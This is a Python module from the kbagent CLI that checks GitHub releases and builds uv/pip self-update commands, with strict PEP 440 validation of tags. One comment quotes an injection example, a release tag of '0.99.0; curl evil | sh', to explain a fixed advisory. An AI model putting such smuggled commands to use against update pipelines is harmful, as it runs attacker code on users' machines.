"""Version service - detect local versions and check for updates.

Provides version information for kbagent, which is auto-updated on startup
(see auto_update.py) and explicitly via ``kbagent update``. The latest
version is resolved from GitHub Releases.
"""

import importlib.util
import logging
import os
import shlex
import shutil
import subprocess
from dataclasses import dataclass
from typing import Any

import httpx
from packaging.version import InvalidVersion, Version

from .. import __version__
from ..constants import (
    ENV_UPDATE_TIMEOUT,
    KBAGENT_GITHUB_REPO,
    KBAGENT_INSTALL_SOURCE,
    UPDATE_TIMEOUT_SECONDS,
    VERSION_CHECK_TIMEOUT,
)
from ..frozen_dist import FrozenDistribution, detect_frozen_distribution
from ..update_runner import (
    DeferredUpdateRequest,
    InstallStatus,
    request_deferred_update,
    run_install,
    should_defer,
)

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class KbagentUpdatePlan:
    """All information needed to perform the terminal kbagent reinstall."""

    current_version: str
    latest_version: str | None
    up_to_date: bool | None
    command: tuple[str, ...] | None
    recovery_command: str | None
    #: Set only when running as a frozen (PyInstaller) native binary, in which
    #: case ``command`` and ``recovery_command`` are deliberately None: a uv/pip
    #: reinstall cannot upgrade a Chocolatey / Homebrew / apt / dnf install and
    #: would create an unrelated second copy instead (see
    #: :mod:`keboola_agent_cli.frozen_dist`). Consumers must report this
    #: channel's own upgrade command rather than attempting the install --
    #: including the deferred Windows path, which is equally inapplicable.
    #: Defaulted so the existing positional constructions stay valid.
    frozen_distribution: FrozenDistribution | None = None


@dataclass(frozen=True)
class UpdatePlan:
    """Immutable explicit-update plan, prepared before the environment mutates."""

    kbagent: KbagentUpdatePlan


def has_server_extras() -> bool:
    """Detect whether the current install was created with ``[server]`` extras.

    The detection probe is ``importlib.util.find_spec('fastapi')``: FastAPI
    is pulled in *only* by the optional ``[server]`` extra (declared in
    ``pyproject.toml``'s ``[project.optional-dependencies]`` table), so its
    presence is a reliable proxy for "user originally installed with
    ``--with 'keboola-cli[server]'``".

    Used by every kbagent self-upgrade path (``kbagent update`` and the
    startup auto-update hook) to decide whether to pair ``uv tool install``
    with ``--with 'keboola-cli[server]'`` -- without that flag, the
    fresh re-resolution silently drops the FastAPI + uvicorn extras and
    breaks ``kbagent serve --ui`` for users who originally installed with
    ``[server]``. (Bug fixed in v0.40.2 for the explicit ``kbagent update``
    path; extended to the startup auto-update hook in v0.41.1.)
    """
    return importlib.util.find_spec("fastapi") is not None


def resolve_kbagent_wheel_url(
    version: str | None, *, timeout: float = VERSION_CHECK_TIMEOUT
) -> str | None:
    """Return the prebuilt-wheel Release asset URL for ``version`` if present.

    The ``release.yml`` workflow (issue #353) attaches a universal
    ``keboola_cli-<version>-py3-none-any.whl`` to every GitHub release.
    Installing that prebuilt wheel skips the on-machine npm/React SPA build that
    makes ``git+`` installs take minutes on WSL.

    A lightweight HEAD probe (verified to return 200 through GitHub's asset CDN
    redirect) confirms the asset actually exists -- releases published before the
    workflow have none, and those must fall back to the ``git+`` source build.

    Args:
        version: Target version (no ``v`` prefix), e.g. ``"0.60.0"``. The tag is
            ``v<version>`` and the asset filename embeds the same version.
        timeout: HEAD-probe timeout in seconds.

    Returns:
        The asset URL on HTTP 200, or ``None`` on any non-200 / network error so
        the caller falls back to :data:`KBAGENT_INSTALL_SOURCE` (git+).
    """
    if not version:
        return None
    url = (
        f"https://github.com/{KBAGENT_GITHUB_REPO}/releases/download/"
        f"v{version}/keboola_cli-{version}-py3-none-any.whl"
    )
    try:
        resp = httpx.head(url, follow_redirects=True, timeout=timeout)
    except httpx.HTTPError:
        return None
    return url if resp.status_code == 200 else None


def get_update_timeout() -> float:
    """Resolve the kbagent self-update subprocess timeout in seconds.

    Defaults to :data:`UPDATE_TIMEOUT_SECONDS`; ``KBAGENT_UPDATE_TIMEOUT``
    overrides it (a ``git+`` source build on WSL can exceed the default -- raise
    it there). Non-numeric or non-positive overrides fall back to the default
    rather than disabling the timeout entirely.
    """
    raw = os.environ.get(ENV_UPDATE_TIMEOUT, "").strip()
    if raw:
        try:
            value = float(raw)
        except ValueError:
            return float(UPDATE_TIMEOUT_SECONDS)
        if value > 0:
            return value
    return float(UPDATE_TIMEOUT_SECONDS)


def build_kbagent_upgrade_command(
    *, prerelease: bool = False, target_version: str | None = None, wheel_url: str | None = None
) -> list[str] | None:
    """Build the argv command to recreate the kbagent tool environment.

    Used by both ``kbagent update`` (explicit) and the startup
    auto-update hook so the two paths stay byte-for-byte consistent --
    in particular, both preserve the optional ``[server]`` extras when
    they were originally installed.

    Args:
        prerelease: When True, opt into pre-release versions (beta / rc).
            uv gets ``--prerelease=allow`` (resolver-level opt-in for the
            entire tool environment), pip gets ``--pre`` (the legacy
            equivalent). Without this flag, both resolvers reject
            pre-release version strings like ``0.44.0b1`` even if they
            are the newest available -- the default-deny behaviour we
            want for cron-driven auto-update so stable users never
            silently land on a beta release.
        target_version: Exact target release. Git fallbacks are always pinned
            to ``@v<target_version>``; mutable ``main`` is never safe for a
            recovery operation.
        wheel_url: When set, install the prebuilt wheel at this URL (a GitHub
            Release asset) via a PEP 508 direct reference instead of building
            from ``git+`` source -- the issue #353 fast path that skips the
            on-machine npm/React build. Takes precedence over ``prerelease`` /
            ``target_version`` (those are git-source knobs; the wheel URL
            already pins an exact version). ``None`` keeps the git+ behaviour.

    Returns:
        Command list ready for :func:`subprocess.run`, or ``None`` if
        neither ``uv`` nor ``pip`` is on ``PATH`` (in which case the
        caller surfaces a manual-install hint).
    """
    # Compatibility for callers that only render a non-actionable command.
    # Every production update path supplies ``target_version`` and therefore
    # takes the exact, full-reinstall branch below.
    if target_version is None:
        legacy_source = wheel_url or KBAGENT_INSTALL_SOURCE
        legacy_has_server = has_server_extras()
        legacy_spec = (
            f"keboola-cli[server] @ {legacy_source}"
            if legacy_has_server
            else f"keboola-cli @ {legacy_source}"
            if wheel_url
            else legacy_source
        )
        uv_path = shutil.which("uv")
        if uv_path:
            if wheel_url:
                cmd = [uv_path, "tool", "install", "--force"]
            elif legacy_has_server:
                cmd = [uv_path, "tool", "install", "--force", "--with", "keboola-cli[server]"]
            else:
                cmd = [uv_path, "tool", "install", "--upgrade"]
            if prerelease:
                cmd.append("--prerelease=allow")
            cmd.append(legacy_spec if wheel_url else legacy_source)
            return cmd
        pip_path = shutil.which("pip")
        if pip_path is None:
            return None
        cmd = [pip_path, "install"]
        if prerelease:
            cmd.append("--pre")
        cmd.append("--upgrade")
        cmd.append(legacy_spec)
        return cmd

    # The wheel is already an exact release artifact. When it is unavailable,
    # pin the source fallback to the corresponding immutable Git tag.
    install_source = wheel_url or f"{KBAGENT_INSTALL_SOURCE}@v{target_version}"
    spec = f"keboola-cli{'[server]' if has_server_extras() else ''} @ {install_source}"
    uv_path = shutil.which("uv")
    if uv_path:
        cmd = [uv_path, "tool", "install", "--force", "--reinstall"]
        if prerelease:
            cmd.append("--prerelease=allow")
        cmd.append(spec)
        return cmd
    pip_path = shutil.which("pip")
    if pip_path is None:
        return None
    # Pip cannot recreate a uv-managed tool environment transactionally; it
    # remains a best-effort fallback and is called out in failure guidance.
    cmd = [pip_path, "install", "--upgrade"]
    if prerelease:
        cmd.append("--pre")
    cmd.append(spec)
    return cmd


def _render_command(command: tuple[str, ...]) -> str:
    """Render argv for the current platform's interactive shell."""
    if os.name == "nt":
        return subprocess.list2cmdline(command)
    return shlex.join(command)


def _recovery_command(command: tuple[str, ...] | None, target_version: str | None) -> str | None:
    """Render an exact forced-reinstall command safe to copy after failure."""
    if command is not None:
        executable = command[0].replace("\\", "/").rsplit("/", maxsplit=1)[-1].casefold()
        if executable in {"uv", "uv.exe"}:
            recovery = ("uv", *command[1:])
        else:
            prerelease = ("--prerelease=allow",) if "--pre" in command else ()
            recovery = ("uv", "tool", "install", "--force", "--reinstall", *prerelease, command[-1])
        return _render_command(recovery)
    if target_version is None:
        return None
    extras = "[server]" if has_server_extras() else ""
    source = f"keboola-cli{extras} @ {KBAGENT_INSTALL_SOURCE}@v{target_version}"
    return _render_command(("uv", "tool", "install", "--force", "--reinstall", source))


def _fetch_kbagent_latest_version(
    timeout: float = VERSION_CHECK_TIMEOUT, *, include_prerelease: bool = False
) -> str | None:
    """Fetch latest kbagent version from GitHub releases.

    Args:
        timeout: HTTP request timeout in seconds.
        include_prerelease: When False (default), call ``/releases/latest``
            which GitHub explicitly defines as "the most recent non-prerelease,
            non-draft release" -- beta tags marked with ``--prerelease`` are
            skipped automatically by the API. When True, call ``/releases``
            (full list), discard drafts, and pick the highest version by
            PEP 440 ordering. This is the opt-in path behind ``kbagent
            update --beta`` so users explicitly asking for a beta can get
            ``0.43.0b1`` even when ``0.42.0`` is the stable.

    Returns:
        Version string like '0.16.0' (stable) or '0.43.0b1' (beta), or
        None on failure.
    """
    try:
        if include_prerelease:
            return _fetch_kbagent_latest_prerelease(timeout)
        response = httpx.get(
            f"https://api.github.com/repos/{KBAGENT_GITHUB_REPO}/releases/latest",
            timeout=timeout,
            follow_redirects=True,
            headers={"Accept": "application/vnd.github.v3+json"},
        )
        response.raise_for_status()
        tag = response.json().get("tag_name", "")
        # Strip a single leading 'v' (e.g. 'v0.16.0' -> '0.16.0').
        version = tag.removeprefix("v")
        # Validate strictly as PEP 440 before the version can flow into the
        # install command / URL (resolve_kbagent_wheel_url /
        # build_kbagent_upgrade_command). The old `re.match(r"\d+\.\d+\.\d+", ...)`
        # was NOT end-anchored, so an adversarial release tag like
        # '0.99.0; curl evil | sh' passed on its '0.99.0' prefix and reached
        # the upgrade command (GHSA-x6cx-93j8-pgwj).
        try:
            Version(version)
        except InvalidVersion:
            logger.warning("Ignoring malformed GitHub release tag %r", tag)
            return None
        return version
    except (httpx.HTTPError, KeyError, ValueError):
        logger.debug("Failed to fetch latest kbagent version", exc_info=True)
        return None


def _fetch_kbagent_latest_prerelease(timeout: float) -> str | None:
    """Fetch the highest non-draft release (incl. pre-release) from GitHub.

    Pulls up to 30 most recent releases (the API's default page size, plenty
    for kbagent's release cadence), filters drafts, parses every tag through
    :class:`packaging.version.Version`, and returns the maximum by PEP 440
    ordering. Pre-release detection relies on ``Version.is_prerelease`` --
    PEP 440 normalises ``v0.43.0-beta.1`` and ``0.43.0b1`` to the same
    canonical form, so the function works for either tag style.

    Returns:
        Highest-by-version tag (stable OR pre-release), normalised to PEP 440
        canonical form (e.g. ``"0.43.0b1"``). None on HTTP / parse failure.
    """
    response = httpx.get(
        f"https://api.github.com/repos/{KBAGENT_GITHUB_REPO}/releases",
        timeout=timeout,
        follow_redirects=True,
        headers={"Accept": "application/vnd.github.v3+json"},
        params={"per_page": 30},
    )
    response.raise_for_status()
    releases = response.json()
    if not isinstance(releases, list):
        return None
    best: Version | None = None
    for entry in releases:
        if not isinstance(entry, dict) or entry.get("draft"):
            continue
        tag = str(entry.get("tag_name", "")).lstrip("v")
        try:
            parsed = Version(tag)
        except InvalidVersion:
            continue
        if best is None or parsed > best:
            best = parsed
    return str(best) if best is not None else None


def _is_up_to_date(local: str | None, latest: str | None) -> bool | None:
    """Compare local and latest versions.

    Args:
        local: Locally installed version string.
        latest: Latest available version string.

    Returns:
        True if up to date, False if update available, None if comparison not possible.
    """
    if local is None or latest is None:
        return None
    try:
        return Version(local) >= Version(latest)
    except InvalidVersion:
        return None


def prepare_kbagent_update_plan(
    latest_version: str | None, *, include_prerelease: bool = False
) -> KbagentUpdatePlan:
    """Prepare the terminal self-reinstall without mutating any environment.

    For a frozen (PyInstaller) binary no install command is produced at all --
    neither ``command`` nor ``recovery_command``. Both would be uv/pip
    invocations that install a *separate* copy rather than upgrading the running
    binary, so the plan instead carries the detected
    :class:`~keboola_agent_cli.frozen_dist.FrozenDistribution` and callers report
    that channel's upgrade command. A ``command`` of None also means the
    deferred Windows helper is never handed anything to install. The wheel-URL
    HEAD probe is skipped too, since its only purpose is building that command.
    """
    up_to_date = _is_up_to_date(__version__, latest_version)
    frozen_distribution = detect_frozen_distribution()
    command: tuple[str, ...] | None = None
    if up_to_date is False and latest_version is not None and frozen_distribution is None:
        wheel_url = resolve_kbagent_wheel_url(latest_version)
        built = build_kbagent_upgrade_command(
            prerelease=include_prerelease,
            target_version=latest_version,
            wheel_url=wheel_url,
        )
        command = tuple(built) if built is not None else None
    return KbagentUpdatePlan(
        current_version=__version__,
        latest_version=latest_version,
        up_to_date=up_to_date,
        command=command,
        recovery_command=(
            _recovery_command(command, latest_version)
            if up_to_date is False and frozen_distribution is None
            else None
        ),
        frozen_distribution=frozen_distribution,
    )


def prepare_update_plan(*, include_prerelease: bool = False) -> UpdatePlan:
    """Complete the update lookup before the updater is allowed to run."""
    # Resolve the latest version first. This ordering prevents a mutated
    # kbagent environment from making a later HTTPS check fail.
    kbagent_latest = _fetch_kbagent_latest_version(include_prerelease=include_prerelease)
    return UpdatePlan(
        kbagent=prepare_kbagent_update_plan(kbagent_latest, include_prerelease=include_prerelease),
    )


class VersionService:
    """Business logic for version detection and update checks."""

    def get_versions(self, *, include_prerelease: bool = False) -> dict[str, Any]:
        """Get version information for kbagent.

        kbagent is auto-updated on startup (see
        :mod:`keboola_agent_cli.auto_update`) and explicitly via
        ``kbagent update``. This method reports:

        - the local installed version,
        - the latest available version (GitHub Releases),
        - the up-to-date status,
        - the upgrade command shown to the user.

        Args:
            include_prerelease: When True, ``latest_version`` reflects the
                newest pre-release (beta / rc) if one is more recent than
                the latest stable; surfaces what ``kbagent update --beta``
                would install.

        Returns:
            Structured dict with kbagent version info.
        """
        kbagent_latest = _fetch_kbagent_latest_version(include_prerelease=include_prerelease)
        kbagent_up_to_date = _is_up_to_date(__version__, kbagent_latest)

        # Persist the freshly-fetched version to the auto-update cache so
        # the next ``kbagent <anything>`` startup hook sees them instead of
        # a stale TTL'd entry. Before v0.41.1 this method bypassed the
        # cache entirely, which meant ``kbagent version`` would show
        # ``v0.41.0 available`` while a follow-up ``kbagent serve --ui`` on
        # the same machine still auto-updated to whatever stale version
        # the cache held (e.g. 0.40.3). Lazy-imported to avoid a circular
        # import: ``auto_update`` imports from this module at module load.
        try:
            from ..auto_update import _write_cache

            _write_cache(latest_version=kbagent_latest)
        except Exception:
            # Cache write is best-effort; never fail the version command
            # because the cache could not be persisted (read-only HOME,
            # disk full, permission error, etc.).
            logger.debug("Could not persist version cache", exc_info=True)

        # Reflect the actual install command the user should run, including
        # --prerelease=allow and @v<version> tag-pin when --beta is active.
        # Without this, programmatic JSON consumers reading upgrade_command
        # would copy a stable-channel install command even though
        # latest_version advertised a beta tag -- silently landing on the
        # wrong version.
        kbagent_target_version = kbagent_latest
        # A frozen native binary is upgraded by the package manager that placed
        # it. Advertising the uv/pip command here would hand every Chocolatey /
        # Homebrew / apt / dnf user a copy-pasteable way to install a SECOND,
        # unrelated kbagent (see frozen_dist.py) -- so the channel's own command
        # replaces it, and the wheel-URL HEAD probe is skipped as dead weight.
        frozen_distribution = detect_frozen_distribution()
        if frozen_distribution is not None:
            # Keep `upgrade_command` a RUNNABLE command or nothing. A consumer
            # that shells out to it verbatim -- the use the gotchas entry
            # documents -- must never be handed the prose hint. Channels with no
            # single command (hand-unpacked archive, unidentified system
            # package) carry the sentence in `upgrade_hint` instead.
            kbagent_upgrade_str = frozen_distribution.upgrade_command or ""
        else:
            # Mirror the _update_kbagent path (issue #353, NB-1): advertise the
            # prebuilt-wheel install command when the asset exists, so a programmatic
            # consumer copy-pasting `upgrade_command` from `kbagent version --json`
            # gets the fast path too instead of a slow git+ source build.
            kbagent_wheel_url = resolve_kbagent_wheel_url(kbagent_latest)
            kbagent_upgrade_cmd = build_kbagent_upgrade_command(
                prerelease=include_prerelease,
                target_version=kbagent_target_version,
                wheel_url=kbagent_wheel_url,
            )
            kbagent_upgrade_str = (
                " ".join(kbagent_upgrade_cmd)
                if kbagent_upgrade_cmd is not None
                else f"uv tool install --upgrade {KBAGENT_INSTALL_SOURCE}"
            )
        kbagent_entry: dict[str, Any] = {
            "version": __version__,
            "latest_version": kbagent_latest,
            "up_to_date": kbagent_up_to_date,
            "upgrade_command": kbagent_upgrade_str,
        }
        # Additive keys, present ONLY on a frozen build, so the JSON shape every
        # existing uv/pip consumer sees stays byte-identical. `upgrade_hint` is
        # always a human sentence; `upgrade_command` is empty when the channel
        # has no single runnable command.
        if frozen_distribution is not None:
            kbagent_entry["install_channel"] = frozen_distribution.channel.value
            kbagent_entry["upgrade_hint"] = frozen_distribution.upgrade_hint
        return {"kbagent": kbagent_entry}

    def self_update(self, *, include_prerelease: bool = False) -> dict[str, Any]:
        """Update kbagent to the latest version.

        Uses ``uv tool install --force --reinstall`` from an exact release
        wheel or Git tag. If the installed kbagent is already at the latest
        version, the update reports ``updated=False`` without running a
        subprocess.

        Args:
            include_prerelease: When True (driven by ``kbagent update --beta``
                or ``KBAGENT_INCLUDE_PRERELEASE=1``), the version lookup
                considers pre-release (beta / rc) releases and the install
                command opts into resolver-level pre-release acceptance.

        Returns:
            Dict with the update result::

                {
                    "kbagent": {"updated": bool, "current_version": str,
                                "latest_version": str|None, "message": str,
                                "output": str|None,
                                # Both below distinguish "not updated YET" from
                                # "failed" -- neither is an error:
                                "deferred": bool,      # handed to the helper
                                "still_running": bool},  # outran the wait
                    "updated": bool,    # True iff kbagent upgraded
                    "message": str,     # Human-readable single-line summary
                }
        """
        plan = prepare_update_plan(include_prerelease=include_prerelease)
        kbagent_result = self._update_kbagent(plan.kbagent)

        return {
            "kbagent": kbagent_result,
            "updated": bool(kbagent_result.get("updated")),
            "message": self._compose_update_summary(kbagent_result),
        }

    @staticmethod
    def _summarize_failure_tail(message: str | None) -> str:
        """Compress a multi-line failure message to its last non-empty line.

        Subprocess failures embed the whole uv/pip transcript; the actionable
        line (e.g. ``error: Executable already exists: kbagent``) is last. We
        surface only that tail in the one-line summary -- the full transcript
        stays in the result's ``output`` for ``--json`` / ``--verbose``.
        """
        lines = [ln.strip() for ln in (message or "").splitlines() if ln.strip()]
        return lines[-1] if lines else "update failed"

    @classmethod
    def _compose_update_summary(cls, kbagent_result: dict[str, Any]) -> str:
        """Build a one-line summary of the update result.

        A non-upgraded result is only "already up to date" when it explicitly
        reports ``up_to_date``. Any other ``updated=False`` means the upgrade
        was ATTEMPTED and FAILED -- surface it instead of masking it as
        success (the silent-failure bug behind the #424 rename: a failed
        self-update was reported as "already up to date").
        """
        parts: list[str] = []
        if kbagent_result.get("updated"):
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}"
                f" -> v{kbagent_result.get('latest_version')}"
            )
        elif kbagent_result.get("deferred"):
            # Scheduled, not failed: the install runs once this process exits.
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}"
                f" -> v{kbagent_result.get('latest_version')} (scheduled)"
            )
        elif kbagent_result.get("still_running"):
            # Outran our patience, not our expectations -- it was never killed.
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}"
                f" -> v{kbagent_result.get('latest_version')} (still installing)"
            )
        elif kbagent_result.get("up_to_date"):
            parts.append(f"kbagent v{kbagent_result.get('current_version')} (already up to date)")
        elif kbagent_result.get("install_channel"):
            # Frozen native binary -- behind, but NOT a failed update: we never
            # attempted one. Must precede the failure branch below, which would
            # otherwise report this deliberate refusal as "update FAILED".
            channel = kbagent_result.get("install_channel")
            action = kbagent_result.get("upgrade_command") or "see the release page"
            latest = kbagent_result.get("latest_version")
            # `latest` is None when the release lookup failed (offline). The
            # refusal is still worth reporting -- the user asked for an update
            # and got none -- but "-> vNone available" is not.
            target = f" -> v{latest} available" if latest else " (latest version unknown)"
            parts.append(
                f"kbagent v{kbagent_result.get('current_version')}{target} "
                f"(standalone {channel} binary; {action})"
            )
        elif kbagent_result.get("current_version"):
            tail = cls._summarize_failure_tail(kbagent_result.get("message"))
            parts.append(f"kbagent v{kbagent_result.get('current_version')} update FAILED: {tail}")

        if not parts:
            return "Nothing to update."
        return " | ".join(parts)

    @staticmethod
    def _update_kbagent(plan: KbagentUpdatePlan) -> dict[str, Any]:
        """Apply a precomputed terminal self-reinstall without new probes.

        Where the reinstall runs is platform-dependent (issue #528). On Windows
        an in-place ``uv tool install`` deletes the very environment this
        process is executing from, cannot finish, and leaves it gutted -- so the
        install is handed to a detached helper that waits for kbagent to exit.
        POSIX keeps the inline install, which is safe because unlinking an open
        file leaves the running process's inode intact.
        """
        old_version = plan.current_version
        kbagent_latest = plan.latest_version
        up_to_date = plan.up_to_date

        if up_to_date is True:
            return {
                "planned": True,
                "updated": False,
                "up_to_date": True,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": f"kbagent v{old_version} is already up to date.",
            }

        # Frozen binary: refuse the self-update and name the real channel. This
        # MUST precede BOTH branches below. The `command is None` branch would
        # tell the user to run `uv tool install --force --reinstall`, and the
        # deferred-helper branch after it is equally inapplicable -- neither can
        # upgrade a Chocolatey / Homebrew / apt / dnf install, they just create a
        # second, unrelated kbagent that shadows theirs on PATH.
        if plan.frozen_distribution is not None:
            frozen = plan.frozen_distribution
            return {
                "planned": True,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "install_channel": frozen.channel.value,
                "upgrade_command": frozen.upgrade_command,
                "message": (
                    f"kbagent v{old_version} is a standalone binary installed via "
                    f"{frozen.channel.value}; it cannot update itself -- "
                    f"{frozen.upgrade_hint}"
                ),
            }

        # Two very different situations reach `command is None`, and reporting
        # them identically sent users chasing the wrong thing: not knowing what
        # to install is usually a transient network or GitHub rate-limit blip,
        # while knowing the version but failing to build a command is a real
        # local problem. Separate them, and never print a recovery command that
        # is not runnable -- the old fallback rendered as a bare
        # `uv tool install --force --reinstall` with no package to install.
        if kbagent_latest is None:
            return {
                "planned": False,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": None,
                "reason": "latest_version_unknown",
                "message": (
                    f"Could not determine the latest kbagent version, so v{old_version} "
                    "was left untouched. This is usually temporary -- no network, or "
                    "GitHub's unauthenticated API rate limit (60 requests/hour per IP, "
                    "shared by every tool on your connection). Try again in a few minutes."
                ),
            }

        if plan.command is None:
            return {
                "planned": True,
                "updated": False,
                "up_to_date": up_to_date,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": (
                    f"Could not prepare a self-update command for v{kbagent_latest}. "
                    f"Recover with: {plan.recovery_command}"
                    if plan.recovery_command
                    else (
                        f"Could not prepare a self-update command for v{kbagent_latest}. "
                        "Reinstall kbagent from the release wheel for that version: "
                        "https://github.com/keboola/cli/releases/latest"
                    )
                ),
                "recovery_command": plan.recovery_command,
            }

        if should_defer():
            scheduled = request_deferred_update(
                DeferredUpdateRequest(
                    from_version=old_version,
                    target_version=kbagent_latest or old_version,
                    install_command=plan.command,
                    recovery_command=plan.recovery_command,
                )
            )
            if scheduled:
                return {
                    "planned": True,
                    "updated": False,
                    "deferred": True,
                    "up_to_date": False,
                    "current_version": old_version,
                    "latest_version": kbagent_latest,
                    "message": (
                        f"kbagent v{kbagent_latest} will be installed as soon as every kbagent "
                        "process has exited -- replacing the environment while it is in use is "
                        "what corrupts it on Windows. Close other kbagent processes; the result "
                        "is reported on the next launch."
                    ),
                    "recovery_command": plan.recovery_command,
                }
            # No helper could be spawned. Running the install here anyway is the
            # exact corruption this branch exists to avoid, so hand the user the
            # command instead of taking the risk on their behalf.
            return {
                "planned": True,
                "updated": False,
                "deferred": False,
                "up_to_date": False,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": (
                    "Update could not be scheduled safely while kbagent is running. "
                    f"Install it from a shell with no kbagent running: {plan.recovery_command}"
                ),
                "recovery_command": plan.recovery_command,
            }

        run = run_install(plan.command, timeout=get_update_timeout())
        if run.status is InstallStatus.SUCCEEDED:
            return {
                "planned": True,
                "updated": True,
                "up_to_date": False,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": f"Updated kbagent from v{old_version} to v{kbagent_latest}. "
                "Restart your shell to use the new version.",
                "output": run.output,
            }
        if run.status is InstallStatus.STILL_RUNNING:
            # Not killed, still installing -- offering a recovery command here
            # would invite a second installer into the same environment. The
            # explicit flag keeps the summary from calling this a failure.
            timeout_s = int(get_update_timeout())
            return {
                "planned": True,
                "updated": False,
                "still_running": True,
                "up_to_date": False,
                "current_version": old_version,
                "latest_version": kbagent_latest,
                "message": (
                    f"Update still running after {timeout_s}s; it continues in the background "
                    f"and applies on the next launch. Log: {run.log_path}"
                ),
                "output": run.output,
            }
        return {
            "planned": True,
            "updated": False,
            "up_to_date": False,
            "current_version": old_version,
            "latest_version": kbagent_latest,
            "message": f"Update failed: {run.output}",
            "output": run.output,
            "recovery_command": plan.recovery_command,
        }
